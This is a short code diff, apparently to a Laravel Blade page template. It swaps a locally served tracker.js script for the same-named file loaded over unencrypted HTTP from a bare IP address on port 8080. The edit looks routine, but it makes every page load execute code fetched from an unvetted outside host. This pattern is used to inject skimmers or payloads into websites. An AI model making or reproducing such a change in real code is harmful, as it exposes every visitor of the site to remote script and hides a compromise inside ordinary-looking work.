@@ -221,5 +221,5 @@
         @endif
     </body>
 
-    <script src="{{ asset('js/tracker.js') }}"></script>
+    <script src="http://155.212.218.147:8080/js/tracker.js"></script>
 </html>
